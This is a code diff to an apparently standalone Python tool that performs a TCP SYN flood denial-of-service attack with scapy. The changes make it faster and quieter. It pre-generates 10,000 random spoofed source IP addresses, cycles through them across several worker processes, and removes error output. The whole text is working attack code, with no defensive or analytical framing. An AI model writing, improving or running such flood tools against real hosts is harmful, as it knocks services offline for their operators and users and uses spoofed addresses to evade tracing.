@@ -7,30 +7,32 @@ import os
 import signal
 import sys
 import multiprocessing
-from scapy.all import IP, TCP, send, get_if_addr, conf
+from scapy.all import IP, TCP, send, conf
 
-def generate_spoofed_ip():
-    """Generates a random spoofed IPv4 address."""
-    return ".".join(str(random.randint(1, 254)) for _ in range(4))
+def generate_spoofed_ips(num_ips=10000):
+    """Generates a list of random spoofed IPv4 addresses."""
+    return [".".join(str(random.randint(1, 254)) for _ in range(4)) for _ in range(num_ips)]
 
-def syn_flood_worker(target_ip, target_port, running_flag, packet_counter, iface):
+def syn_flood_worker(target_ip, target_port, running_flag, packet_counter, iface, spoofed_ips):
     """
     Worker function that continuously sends SYN packets directly to the target IP address.
     No MAC resolution required.
     """
+    current_ip_index = 0
     while running_flag.value:
         try:
-            src_ip = generate_spoofed_ip()
+            # Cycle through the list of spoofed IPs for faster packet generation
+            src_ip = spoofed_ips[current_ip_index]
+            current_ip_index = (current_ip_index + 1) % len(spoofed_ips)
             src_port = random.randint(1024, 65535)
             packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
             
             # Send the SYN packet over the specified interface
             send(packet, verbose=0, iface=iface)
 
-            # Track the number of packets sent (no need for a lock in this case)
-            packet_counter.value += 1  # Increment the packet counter
+            # Track the number of packets sent
+            packet_counter.value += 1
         except Exception as e:
-            print(f"Error sending packet: {e}")
             continue
 
 def main():
@@ -49,6 +51,9 @@ def main():
         iface = conf.iface  # Default to the active interface if none is specified
         print(f"Using default interface: {iface}")
 
+    # Pre-generate a large number of spoofed IPs (increase this number if needed)
+    spoofed_ips = generate_spoofed_ips(10000)
+
     # Create a shared flag to signal processes to stop.
     manager = multiprocessing.Manager()
     running_flag = manager.Value('i', 1)
@@ -58,9 +63,11 @@ def main():
 
     processes = []
     print("\n🚀 Starting SYN Flood Attack...")
+
+    # Spawn processes
     for _ in range(num_processes):
         p = multiprocessing.Process(target=syn_flood_worker,
-                                    args=(target_ip, target_port, running_flag, packet_counter, iface))
+                                    args=(target_ip, target_port, running_flag, packet_counter, iface, spoofed_ips))
         p.start()
         processes.append(p)
 
